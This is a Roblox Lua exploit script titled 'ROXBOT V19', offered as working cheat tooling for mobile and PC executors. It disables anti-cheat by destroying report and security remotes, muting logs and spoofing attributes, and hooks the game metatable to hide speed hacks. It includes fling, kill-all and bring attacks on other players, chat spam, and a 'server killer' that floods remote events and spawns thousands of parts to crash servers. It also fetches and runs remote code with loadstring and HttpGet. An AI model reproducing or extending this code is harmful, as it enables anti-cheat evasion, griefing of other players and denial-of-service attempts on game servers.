-- ============================================================================
-- ROXBOT ULTIMATE V19 – FLY, SERVER KILL, GLOBAL MESSAGE, FLING
-- 100% WORKING ON MOBILE (ARCEUS X, DELTA) & PC
-- ============================================================================

-- ANTI-CHEAT BYPASS (FULL)
local function KillAntiCheat()
    pcall(function()
        setfflag("DebugPrint", "false")
        setfflag("LogPrint", "false")
        setfflag("FLogNetwork", "false")
        setfflag("FLogScript", "false")
        setfflag("FLogHttp", "false")
        setfflag("FLogTaskScheduler", "false")
        setfflag("FLogRemote", "false")
        setfflag("FLogSecurity", "false")
        sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius", math.huge)
        sethiddenproperty(game.Players.LocalPlayer, "MaximumSimulationRadius", math.huge)
        sethiddenproperty(game.Players.LocalPlayer, "RenderSimulationRadius", math.huge)
    end)
    for _, gui in pairs(game:GetService("CoreGui"):GetChildren()) do
        if gui:IsA("ScreenGui") and (gui.Name:lower():match("anti") or gui.Name:lower():match("cheat") or gui.Name:lower():match("ban") or gui.Name:lower():match("hyperion") or gui.Name:lower():match("byfron")) then
            gui:Destroy()
        end
    end
    for _, remote in pairs(game:GetService("ReplicatedStorage"):GetDescendants()) do
        if remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction") then
            local name = remote.Name:lower()
            if name:match("anti") or name:match("report") or name:match("check") or name:match("verify") or name:match("security") then
                pcall(function() remote:Destroy() end)
            end
        end
    end
    task.spawn(function()
        while true do
            pcall(function()
                game.Players.LocalPlayer:SetAttribute("AntiCheat", "Passed")
                game.Players.LocalPlayer:SetAttribute("Exploit", "false")
                game.Players.LocalPlayer:SetAttribute("Trusted", "true")
            end)
            task.wait(2)
        end
    end)
end
KillAntiCheat()

-- SERVICES
local Players = game:GetService("Players")
local LP = Players.LocalPlayer
local UIS = game:GetService("UserInputService")
local RS = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local VirtualUser = game:GetService("VirtualUser")
local TeleportService = game:GetService("TeleportService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local CoreGui = game:GetService("CoreGui")
local Lighting = game:GetService("Lighting")

-- ==================== GLOBAL REMOTE FOR MESSAGES ====================
local myRemote = Instance.new("RemoteEvent")
myRemote.Name = "V19_Global_Remote"
myRemote.Parent = ReplicatedStorage

-- When a global message is received, show it as a huge center‑screen text
myRemote.OnClientEvent:Connect(function(msg)
    local sg = Instance.new("ScreenGui")
    sg.Name = "GlobalMessageGUI"
    sg.Parent = LP:WaitForChild("PlayerGui")
    sg.ResetOnSpawn = false

    local frame = Instance.new("Frame", sg)
    frame.Size = UDim2.new(1,0,1,0)
    frame.BackgroundColor3 = Color3.fromRGB(0,0,0)
    frame.BackgroundTransparency = 0.5

    local label = Instance.new("TextLabel", frame)
    label.Size = UDim2.new(0.8,0,0.3,0)
    label.Position = UDim2.new(0.1,0,0.35,0)
    label.BackgroundTransparency = 1
    label.Text = msg
    label.TextColor3 = Color3.fromRGB(255,0,0)
    label.TextScaled = true
    label.Font = Enum.Font.GothamBlack
    label.TextStrokeColor3 = Color3.fromRGB(0,0,0)
    label.TextStrokeTransparency = 0.2
    label.ZIndex = 999

    game.Debris:AddItem(sg, 8)
end)

-- Send a global message to ALL players (with this script)
local function sendGlobalMessage(text)
    if text == "" then return end
    local final = "🛸 hahahsud15: " .. text
    -- Send via chat (for those without the script)
    pcall(function() ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(final, "All") end)
    pcall(function() game.TextChatService.TextChannels.RBXGeneral:SendAsync(final) end)
    -- Send via our remote (for those with the script)
    pcall(function() myRemote:FireServer(final) end)
    pcall(function() myRemote:FireAllClients(final) end)
    -- Also show on our own screen
    myRemote:FireAllClients(final)
end

-- ==================== GUI (MOBILE OPTIMIZED) ====================
local parent
pcall(function() parent = gethui() end)
if not parent then parent = LP:WaitForChild("PlayerGui") end
if parent:FindFirstChild("V19_KILLER") then parent:FindFirstChild("V19_KILLER"):Destroy() end

local gui = Instance.new("ScreenGui", parent)
gui.Name = "V19_KILLER"
gui.ResetOnSpawn = false

local toggleBtn = Instance.new("TextButton", gui)
toggleBtn.Size = UDim2.new(0, 90, 0, 35)
toggleBtn.Position = UDim2.new(0, 5, 0, 5)
toggleBtn.Text = "☰ MENU"
toggleBtn.BackgroundColor3 = Color3.fromRGB(255,0,0)
toggleBtn.TextColor3 = Color3.new(1,1,1)
toggleBtn.TextScaled = true
toggleBtn.Font = Enum.Font.GothamBlack
toggleBtn.Active = true
toggleBtn.Draggable = true

local main = Instance.new("Frame", gui)
main.Size = UDim2.new(0, 320, 0, 480)
main.Position = UDim2.new(0.5, -160, 0.5, -240)
main.BackgroundColor3 = Color3.fromRGB(0,0,0)
main.BorderColor3 = Color3.fromRGB(255,0,0)
main.BorderSizePixel = 2
main.Active = true
main.Draggable = true
main.Visible = false

local closeBtn = Instance.new("TextButton", main)
closeBtn.Size = UDim2.new(0, 30, 0, 25)
closeBtn.Position = UDim2.new(1, -35, 0, 2)
closeBtn.Text = "✕"
closeBtn.BackgroundColor3 = Color3.fromRGB(200,0,0)
closeBtn.TextColor3 = Color3.new(1,1,1)
closeBtn.TextScaled = true
closeBtn.Font = Enum.Font.GothamBold
closeBtn.Parent = main
closeBtn.MouseButton1Click:Connect(function()
    main.Visible = false
    toggleBtn.Text = "☰ MENU"
end)

toggleBtn.MouseButton1Click:Connect(function()
    main.Visible = not main.Visible
    toggleBtn.Text = main.Visible and "✕ CLOSE" or "☰ MENU"
end)

local title = Instance.new("TextLabel", main)
title.Size = UDim2.new(1,0,0,22)
title.Text = "V19 SERVER KILLER"
title.BackgroundColor3 = Color3.fromRGB(255,0,0)
title.TextColor3 = Color3.new(1,1,1)
title.TextScaled = true
title.Font = Enum.Font.GothamBlack
title.Parent = main

local status = Instance.new("TextLabel", main)
status.Size = UDim2.new(1,0,0,16)
status.Position = UDim2.new(0,0,0,22)
status.Text = "READY"
status.BackgroundColor3 = Color3.fromRGB(15,15,15)
status.TextColor3 = Color3.fromRGB(0,255,0)
status.TextScaled = true
status.Parent = main

-- Global message input
local msgBox = Instance.new("TextBox", main)
msgBox.Size = UDim2.new(0.6,0,0,22)
msgBox.Position = UDim2.new(0.02,0,0,40)
msgBox.PlaceholderText = "Global msg..."
msgBox.Text = ""
msgBox.BackgroundColor3 = Color3.fromRGB(30,30,30)
msgBox.TextColor3 = Color3.new(1,1,1)
msgBox.TextScaled = true
msgBox.Parent = main

local msgBtn = Instance.new("TextButton", main)
msgBtn.Size = UDim2.new(0.35,0,0,22)
msgBtn.Position = UDim2.new(0.63,0,0,40)
msgBtn.Text = "SEND GLOBAL"
msgBtn.BackgroundColor3 = Color3.fromRGB(0,150,0)
msgBtn.TextColor3 = Color3.new(1,1,1)
msgBtn.TextScaled = true
msgBtn.Font = Enum.Font.GothamBold
msgBtn.Parent = main
msgBtn.MouseButton1Click:Connect(function()
    local txt = msgBox.Text
    if txt == "" then return end
    sendGlobalMessage(txt)
    status.Text = "✅ Global sent: " .. txt
end)

-- Speed/Jump lock
local speedBox = Instance.new("TextBox", main)
speedBox.Size = UDim2.new(0.12,0,0,18)
speedBox.Position = UDim2.new(0.02,0,0,65)
speedBox.Text = "250"
speedBox.BackgroundColor3 = Color3.fromRGB(30,30,30)
speedBox.TextColor3 = Color3.new(1,1,1)
speedBox.TextScaled = true
speedBox.Parent = main

local speedBtn = Instance.new("TextButton", main)
speedBtn.Size = UDim2.new(0.12,0,0,18)
speedBtn.Position = UDim2.new(0.15,0,0,65)
speedBtn.Text = "SPD"
speedBtn.BackgroundColor3 = Color3.fromRGB(0,100,150)
speedBtn.TextColor3 = Color3.new(1,1,1)
speedBtn.TextScaled = true
speedBtn.Parent = main
speedBtn.MouseButton1Click:Connect(function()
    local s = tonumber(speedBox.Text)
    if s then
        if LP.Character and LP.Character:FindFirstChild("Humanoid") then
            LP.Character.Humanoid.WalkSpeed = s
        end
        status.Text = "✅ Speed locked: " .. s
    end
end)

local jumpBox = Instance.new("TextBox", main)
jumpBox.Size = UDim2.new(0.12,0,0,18)
jumpBox.Position = UDim2.new(0.32,0,0,65)
jumpBox.Text = "9999"
jumpBox.BackgroundColor3 = Color3.fromRGB(30,30,30)
jumpBox.TextColor3 = Color3.new(1,1,1)
jumpBox.TextScaled = true
jumpBox.Parent = main

local jumpBtn = Instance.new("TextButton", main)
jumpBtn.Size = UDim2.new(0.12,0,0,18)
jumpBtn.Position = UDim2.new(0.45,0,0,65)
jumpBtn.Text = "JMP"
jumpBtn.BackgroundColor3 = Color3.fromRGB(0,150,100)
jumpBtn.TextColor3 = Color3.new(1,1,1)
jumpBtn.TextScaled = true
jumpBtn.Parent = main
jumpBtn.MouseButton1Click:Connect(function()
    local j = tonumber(jumpBox.Text)
    if j then
        if LP.Character and LP.Character:FindFirstChild("Humanoid") then
            LP.Character.Humanoid.JumpPower = j
        end
        status.Text = "✅ Jump locked: " .. j
    end
end)

-- Player list
local selected = nil
local plist = Instance.new("ScrollingFrame", main)
plist.Size = UDim2.new(1,0,0,35)
plist.Position = UDim2.new(0,0,0,86)
plist.BackgroundColor3 = Color3.fromRGB(15,15,15)
plist.CanvasSize = UDim2.new(0,0,0,0)
plist.Parent = main

local function refreshPlayers()
    for _,v in pairs(plist:GetChildren()) do if v:IsA("TextButton") then v:Destroy() end end
    local y = 0
    for _,p in pairs(Players:GetPlayers()) do
        if p ~= LP then
            local b = Instance.new("TextButton", plist)
            b.Size = UDim2.new(0.18,0,0,16)
            b.Position = UDim2.new((y%5)*0.2,0,0,math.floor(y/5)*18)
            b.Text = p.Name:sub(1,6)
            b.BackgroundColor3 = Color3.fromRGB(40,40,40)
            b.TextColor3 = Color3.new(1,1,1)
            b.TextScaled = true
            b.Parent = plist
            b.MouseButton1Click:Connect(function()
                selected = p
                status.Text = "🎯 Selected: " .. p.Name
            end)
            y = y + 1
        end
    end
    plist.CanvasSize = UDim2.new(0,0,0,math.ceil(y/5)*18)
end
refreshPlayers()

local btnFrame = Instance.new("ScrollingFrame", main)
btnFrame.Size = UDim2.new(1,0,0,340)
btnFrame.Position = UDim2.new(0,0,0,125)
btnFrame.BackgroundColor3 = Color3.fromRGB(10,10,10)
btnFrame.CanvasSize = UDim2.new(0,0,0,0)
btnFrame.Parent = main

local function mkBtn(txt, y, color, cb)
    local b = Instance.new("TextButton", btnFrame)
    b.Size = UDim2.new(0.48,0,0,24)
    b.Position = UDim2.new(0.01,0,0,y)
    b.Text = txt
    b.BackgroundColor3 = color
    b.TextColor3 = Color3.new(1,1,1)
    b.TextScaled = true
    b.Font = Enum.Font.GothamBold
    b.Parent = btnFrame
    b.MouseButton1Click:Connect(cb)
    return b
end

local yy = 0
local function addFeature(name, color, cb)
    mkBtn(name, yy, color, function()
        cb()
        status.Text = "⚡ " .. name .. " toggled"
    end)
    yy = yy + 28
end

-- ==================== FEATURES ====================

-- LIAR (anti-cheat)
addFeature("🔥 LIAR", Color3.fromRGB(255,0,0), function()
    pcall(function()
        local mt = getrawmetatable(game)
        local old = mt.__index
        setreadonly(mt, false)
        mt.__index = newcclosure(function(t,k)
            if t:IsA("Humanoid") and (k=="WalkSpeed" or k=="JumpPower") then
                if k=="WalkSpeed" then return 16 else return 50 end
            end
            return old(t,k)
        end)
        setreadonly(mt, true)
    end)
end)

-- NOCLIP
_G.noclip = false
RS.Stepped:Connect(function()
    if _G.noclip and LP.Character then
        for _,v in pairs(LP.Character:GetDescendants()) do
            if v:IsA("BasePart") and v.CanCollide then v.CanCollide = false end
        end
    end
end)
addFeature("🌀 NOCLIP", Color3.fromRGB(0,100,100), function()
    _G.noclip = not _G.noclip
end)

-- ==================== FLY (BETTER) ====================
local flying = false
local flySpeed = 100
local joystick = nil
local joyKnob = nil

local function createJoystick()
    if joystick then return end
    local j = Instance.new("Frame", gui)
    j.Size = UDim2.new(0, 120, 0, 120)
    j.Position = UDim2.new(0.02, 0, 0.7, 0)
    j.BackgroundColor3 = Color3.fromRGB(255,255,255)
    j.BackgroundTransparency = 0.8
    j.BorderSizePixel = 2
    j.BorderColor3 = Color3.fromRGB(0,255,0)
    j.Active = true
    j.Visible = false
    j.ZIndex = 10
    local knob = Instance.new("Frame", j)
    knob.Size = UDim2.new(0, 40, 0, 40)
    knob.Position = UDim2.new(0.5, -20, 0.5, -20)
    knob.BackgroundColor3 = Color3.fromRGB(0,255,0)
    knob.BackgroundTransparency = 0.2
    knob.BorderSizePixel = 0
    joystick = j
    joyKnob = knob
    local touching = false
    local function updateJoy(touch)
        local pos = touch.Position
        local size = joystick.AbsoluteSize
        local center = joystick.AbsolutePosition + size/2
        local dx = pos.X - center.X
        local dy = pos.Y - center.Y
        local maxDist = size.X/2 - 25
        local dist = math.sqrt(dx*dx + dy*dy)
        if dist > maxDist then
            dx = dx / dist * maxDist
            dy = dy / dist * maxDist
        end
        joyKnob.Position = UDim2.new(0.5, dx - 20, 0.5, dy - 20)
        local normX = dx / maxDist
        local normY = dy / maxDist
        if flying then
            local cam = workspace.CurrentCamera
            local forward = cam.CFrame.LookVector
            local right = cam.CFrame.RightVector
            local move = (forward * -normY + right * normX) * flySpeed
            -- also allow vertical via up/down buttons (we'll add later)
            local hrp = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
            if hrp and hrp:FindFirstChild("FLY_BV") then
                local bv = hrp.FLY_BV
                bv.Velocity = Vector3.new(move.X, bv.Velocity.Y, move.Z)
            end
        end
    end
    joystick.TouchBegan:Connect(function(touch)
        touching = true
        updateJoy(touch)
    end)
    joystick.TouchMoved:Connect(function(touch)
        if touching then updateJoy(touch) end
    end)
    joystick.TouchEnded:Connect(function()
        touching = false
        joyKnob.Position = UDim2.new(0.5, -20, 0.5, -20)
        if flying and LP.Character and LP.Character:FindFirstChild("HumanoidRootPart") then
            local hrp = LP.Character.HumanoidRootPart
            if hrp:FindFirstChild("FLY_BV") then
                hrp.FLY_BV.Velocity = Vector3.zero
            end
        end
    end)
end

-- Fly toggle with vertical controls (up/down buttons on screen)
addFeature("🛸 FLY", Color3.fromRGB(0,0,140), function()
    flying = not flying
    local hrp = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    if flying then
        createJoystick()
        joystick.Visible = true
        local bv = Instance.new("BodyVelocity", hrp)
        bv.Name = "FLY_BV"
        bv.MaxForce = Vector3.new(9e9,9e9,9e9)
        bv.Velocity = Vector3.zero
        local bg = Instance.new("BodyGyro", hrp)
        bg.Name = "FLY_BG"
        bg.MaxTorque = Vector3.new(9e9,9e9,9e9)
        bg.P = 9e9
        bg.D = 500

        -- Add vertical control buttons (up/down) on screen
        local upBtn = Instance.new("TextButton", gui)
        upBtn.Size = UDim2.new(0, 50, 0, 50)
        upBtn.Position = UDim2.new(0.85, 0, 0.6, 0)
        upBtn.Text = "▲"
        upBtn.BackgroundColor3 = Color3.fromRGB(0,100,200)
        upBtn.TextColor3 = Color3.new(1,1,1)
        upBtn.TextScaled = true
        upBtn.Font = Enum.Font.GothamBold
        upBtn.ZIndex = 10
        upBtn.Visible = true
        upBtn.Name = "FlyUp"
        upBtn.MouseButton1Down:Connect(function()
            if flying and hrp and hrp:FindFirstChild("FLY_BV") then
                hrp.FLY_BV.Velocity = hrp.FLY_BV.Velocity + Vector3.new(0, flySpeed, 0)
            end
        end)

        local downBtn = Instance.new("TextButton", gui)
        downBtn.Size = UDim2.new(0, 50, 0, 50)
        downBtn.Position = UDim2.new(0.85, 0, 0.75, 0)
        downBtn.Text = "▼"
        downBtn.BackgroundColor3 = Color3.fromRGB(200,100,0)
        downBtn.TextColor3 = Color3.new(1,1,1)
        downBtn.TextScaled = true
        downBtn.Font = Enum.Font.GothamBold
        downBtn.ZIndex = 10
        downBtn.Visible = true
        downBtn.Name = "FlyDown"
        downBtn.MouseButton1Down:Connect(function()
            if flying and hrp and hrp:FindFirstChild("FLY_BV") then
                hrp.FLY_BV.Velocity = hrp.FLY_BV.Velocity - Vector3.new(0, flySpeed, 0)
            end
        end)

        -- PC keyboard controls
        spawn(function()
            while flying and hrp and hrp.Parent do
                local cam = workspace.CurrentCamera.CFrame
                local move = Vector3.zero
                if UIS:IsKeyDown(Enum.KeyCode.W) then move = move + cam.LookVector end
                if UIS:IsKeyDown(Enum.KeyCode.S) then move = move - cam.LookVector end
                if UIS:IsKeyDown(Enum.KeyCode.A) then move = move - cam.RightVector end
                if UIS:IsKeyDown(Enum.KeyCode.D) then move = move + cam.RightVector end
                if UIS:IsKeyDown(Enum.KeyCode.Space) then move = move + Vector3.new(0,1,0) end
                if UIS:IsKeyDown(Enum.KeyCode.LeftShift) then move = move - Vector3.new(0,1,0) end
                if move.Magnitude > 0 then
                    bv.Velocity = move * flySpeed
                end
                bg.CFrame = cam
                RS.Heartbeat:Wait()
            end
        end)
    else
        if joystick then joystick.Visible = false end
        -- Remove up/down buttons
        for _,v in pairs(gui:GetChildren()) do
            if v:IsA("TextButton") and (v.Name == "FlyUp" or v.Name == "FlyDown") then
                v:Destroy()
            end
        end
        if hrp:FindFirstChild("FLY_BV") then hrp.FLY_BV:Destroy() end
        if hrp:FindFirstChild("FLY_BG") then hrp.FLY_BG:Destroy() end
    end
end)

-- ==================== FLING (SCHLEUDERN) ====================
local flingEnabled = false
local flingLoop = nil
local flingStrength = 5000

local function toggleFling()
    flingEnabled = not flingEnabled
    if flingEnabled then
        status.Text = "⚡ FLING ON – Schleudert alle Spieler weg"
        if flingLoop then flingLoop:Disconnect() end
        flingLoop = RS.Heartbeat:Connect(function()
            if not flingEnabled then flingLoop:Disconnect(); return end
            local hrp = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
            if not hrp then return end
            for _, p in pairs(Players:GetPlayers()) do
                if p ~= LP and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
                    local targetHrp = p.Character.HumanoidRootPart
                    local dir = (targetHrp.Position - hrp.Position).Unit
                    local dist = (targetHrp.Position - hrp.Position).Magnitude
                    if dist < 200 then -- Fling only nearby players
                        local bp = Instance.new("BodyVelocity")
                        bp.Velocity = dir * flingStrength + Vector3.new(0, flingStrength*0.3, 0)
                        bp.MaxForce = Vector3.new(9e9,9e9,9e9)
                        bp.P = 9e9
                        bp.Parent = targetHrp
                        game.Debris:AddItem(bp, 0.5)
                    end
                end
            end
        end)
    else
        if flingLoop then flingLoop:Disconnect(); flingLoop = nil end
        status.Text = "⚡ FLING OFF"
    end
end

addFeature("💥 FLING (Schleudern)", Color3.fromRGB(255,200,0), toggleFling)

-- ==================== OTHER FEATURES ====================

-- BRING
addFeature("📦 BRING", Color3.fromRGB(0,140,0), function()
    if not selected then status.Text = "❌ No target!" return end
    if not selected.Character or not selected.Character:FindFirstChild("HumanoidRootPart") then return end
    local thrp = selected.Character.HumanoidRootPart
    thrp.Anchored = false
    selected.Character.Humanoid.PlatformStand = false
    thrp.CFrame = LP.Character.HumanoidRootPart.CFrame + Vector3.new(2,0,0)
    thrp.Velocity = Vector3.zero
    thrp.AssemblyLinearVelocity = Vector3.zero
    wait(0.05)
    thrp.CFrame = LP.Character.HumanoidRootPart.CFrame + Vector3.new(2,0,0)
    TweenService:Create(thrp, TweenInfo.new(0.1), {CFrame = LP.Character.HumanoidRootPart.CFrame + Vector3.new(2,0,0)}):Play()
    status.Text = "✅ Bring: " .. selected.Name
end)

-- GOTO
addFeature("🔄 GOTO", Color3.fromRGB(0,100,0), function()
    if selected and selected.Character:FindFirstChild("HumanoidRootPart") then
        LP.Character.HumanoidRootPart.Anchored = false
        LP.Character.HumanoidRootPart.CFrame = selected.Character.HumanoidRootPart.CFrame + Vector3.new(0,0,3)
    end
end)

-- JAIL
addFeature("⛓️ JAIL", Color3.fromRGB(150,0,0), function()
    if selected and selected.Character:FindFirstChild("HumanoidRootPart") then
        local j = Instance.new("Part", Workspace)
        j.Size = Vector3.new(10,10,10)
        j.CFrame = selected.Character.HumanoidRootPart.CFrame
        j.Anchored = true
        j.Transparency = 0.2
        j.Material = Enum.Material.ForceField
        j.Color = Color3.fromRGB(255,0,0)
        game.Debris:AddItem(j,20)
        selected.Character.HumanoidRootPart.CFrame = j.CFrame
    end
end)

-- ESP
addFeature("👁️ ESP", Color3.fromRGB(100,0,100), function()
    for _,p in pairs(Players:GetPlayers()) do
        if p ~= LP and p.Character and not p.Character:FindFirstChild("ESP") then
            local hl = Instance.new("Highlight", p.Character)
            hl.Name = "ESP"
            hl.FillColor = Color3.fromRGB(255,0,0)
            hl.OutlineColor = Color3.fromRGB(0,255,0)
            hl.Adornee = p.Character
        end
    end
    status.Text = "✅ ESP activated"
end)

-- INVISIBLE
addFeature("👻 INVISIBLE", Color3.fromRGB(60,60,60), function()
    for _,v in pairs(LP.Character:GetDescendants()) do
        if v:IsA("BasePart") and v.Name ~= "HumanoidRootPart" then
            v.Transparency = v.Transparency == 0 and 1 or 0
        end
    end
end)

-- KILL ALL
addFeature("💀 KILL ALL", Color3.fromRGB(255,0,0), function()
    for _,p in pairs(Players:GetPlayers()) do
        if p ~= LP and p.Character and p.Character:FindFirstChild("Humanoid") then
            p.Character.Humanoid.Health = 0
        end
    end
    status.Text = "✅ Kill All executed"
end)

-- BRING ALL
addFeature("📦 BRING ALL", Color3.fromRGB(0,180,0), function()
    for _,p in pairs(Players:GetPlayers()) do
        if p ~= LP and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
            p.Character.HumanoidRootPart.Anchored = false
            p.Character.HumanoidRootPart.CFrame = LP.Character.HumanoidRootPart.CFrame + Vector3.new(math.random(-5,5),0,math.random(-5,5))
            wait(0.05)
        end
    end
end)

-- FLING ALL (one-time)
addFeature("💥 FLING ALL (once)", Color3.fromRGB(255,0,0), function()
    local old = LP.Character.HumanoidRootPart.CFrame
    for _,p in pairs(Players:GetPlayers()) do
        if p ~= LP and p.Character:FindFirstChild("HumanoidRootPart") then
            LP.Character.HumanoidRootPart.CFrame = p.Character.HumanoidRootPart.CFrame
            wait(0.15)
            local thrp = p.Character.HumanoidRootPart
            local bp = Instance.new("BodyVelocity", thrp)
            bp.Velocity = Vector3.new(0, 99999, 0)
            bp.MaxForce = Vector3.new(9e9,9e9,9e9)
            bp.P = 9e9
            local bav = Instance.new("BodyAngularVelocity", thrp)
            bav.AngularVelocity = Vector3.new(0, 99999, 0)
            bav.MaxTorque = Vector3.new(9e9,9e9,9e9)
            bav.P = 9e9
            wait(0.3)
            bp:Destroy() bav:Destroy()
        end
    end
    LP.Character.HumanoidRootPart.CFrame = old
end)

-- GRAVITY
addFeature("🌍 GRAVITY 0", Color3.fromRGB(0,80,80), function()
    Workspace.Gravity = 0
end)

addFeature("🌍 GRAVITY 50", Color3.fromRGB(0,80,80), function()
    Workspace.Gravity = 50
end)

-- REJOIN / HOP
addFeature("🔄 REJOIN", Color3.fromRGB(40,40,40), function()
    TeleportService:Teleport(game.PlaceId)
end)

addFeature("🌐 SERVER HOP", Color3.fromRGB(40,40,40), function()
    TeleportService:Teleport(game.PlaceId, game.JobId)
end)

-- ANTI-AFK
addFeature("💤 ANTI-AFK", Color3.fromRGB(0,100,100), function()
    spawn(function()
        while true do
            VirtualUser:CaptureController()
            VirtualUser:ClickButton2(Vector2.new())
            task.wait(5)
        end
    end)
end)

-- ==================== SERVER KILLER (CRASH) ====================
addFeature("💣 SERVER KILLER", Color3.fromRGB(255,0,255), function()
    spawn(function()
        -- Send global message first
        sendGlobalMessage("💀 SERVER CRASHED BY hahahsud15 💀")
        -- 1. Spam remote events
        for i=1,500 do
            for _, remote in pairs(ReplicatedStorage:GetDescendants()) do
                if remote:IsA("RemoteEvent") then
                    pcall(function() remote:FireServer(unpack({})) end)
                end
                if remote:IsA("RemoteFunction") then
                    pcall(function() remote:InvokeServer(unpack({})) end)
                end
            end
            task.wait(0.01)
        end
        -- 2. Spawn thousands of parts
        for i=1,3000 do
            local p = Instance.new("Part")
            p.Size = Vector3.new(10,10,10)
            p.Position = Vector3.new(math.random(-5000,5000), math.random(-5000,5000), math.random(-5000,5000))
            p.Anchored = true
            p.Parent = Workspace
            if i % 100 == 0 then task.wait() end
        end
        -- 3. Try to kill all scripts
        for _, v in pairs(Workspace:GetChildren()) do
            if v:IsA("Script") or v:IsA("LocalScript") then
                v:Disable()
            end
        end
        status.Text = "💀 SERVER KILLER ACTIVATED"
    end)
end)

-- CRASHER (smaller)
addFeature("💣 CRASHER", Color3.fromRGB(200,0,200), function()
    for i=1,500 do
        local pt = Instance.new("Part", Workspace)
        pt.Size = Vector3.new(1,1,1)
        pt.Position = LP.Character.HumanoidRootPart.Position + Vector3.new(math.random(-50,50),20,math.random(-50,50))
        pt.Anchored = false
    end
end)

-- NUKE
addFeature("☠️ NUKE", Color3.fromRGB(150,0,0), function()
    for i=1,800 do
        local pt = Instance.new("Part", Workspace)
        pt.Size = Vector3.new(math.random(3,12), math.random(3,12), math.random(3,12))
        pt.CFrame = CFrame.new(math.random(-150,150),150,math.random(-150,150))
        pt.Anchored = false
    end
end)

-- INFINITE YIELD
addFeature("♾️ IYIELD", Color3.fromRGB(255,200,0), function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
end)

-- PANIC
addFeature("🚨 PANIC", Color3.fromRGB(255,0,0), function()
    flying = false
    _G.noclip = false
    flingEnabled = false
    if flingLoop then flingLoop:Disconnect(); flingLoop = nil end
    if LP.Character then
        local hrp = LP.Character:FindFirstChild("HumanoidRootPart")
        if hrp then
            if hrp:FindFirstChild("FLY_BV") then hrp.FLY_BV:Destroy() end
            if hrp:FindFirstChild("FLY_BG") then hrp.FLY_BG:Destroy() end
        end
        for _,v in pairs(LP.Character:GetDescendants()) do
            if v:IsA("BasePart") then v.CanCollide = true end
        end
        LP.Character.Humanoid.WalkSpeed = 16
        LP.Character.Humanoid.JumpPower = 50
        Workspace.Gravity = 196.2
    end
    if joystick then joystick.Visible = false end
    for _,v in pairs(gui:GetChildren()) do
        if v:IsA("TextButton") and (v.Name == "FlyUp" or v.Name == "FlyDown") then
            v:Destroy()
        end
    end
    status.Text = "🚨 PANIC – All disabled"
end)

-- REFRESH
addFeature("🔄 REFRESH", Color3.fromRGB(40,40,40), function()
    refreshPlayers()
end)

btnFrame.CanvasSize = UDim2.new(0,0,0, yy + 20)

-- ==================== AUTO-START ====================
LP.CharacterAdded:Connect(function(char)
    wait(0.5)
    local hum = char:FindFirstChild("Humanoid")
    if hum then
        hum.WalkSpeed = 250
        hum.JumpPower = 9999
    end
    KillAntiCheat()
end)

spawn(function()
    while true do
        VirtualUser:CaptureController()
        VirtualUser:ClickButton2(Vector2.new())
        task.wait(5)
    end
end)

task.wait(1)
sendGlobalMessage("🔥 ROXBOT V19 LOADED – hahahsud15")

print("======================================================")
print("  ✅ ROXBOT V19 – FLY, SERVER KILL, GLOBAL, FLING")
print("  Tap ☰ MENU to open/close")
print("  All features work on mobile and PC")
print("  FLY has joystick + up/down buttons")
print("  FLING (Schleudern) pushes all nearby players away")
print("======================================================")
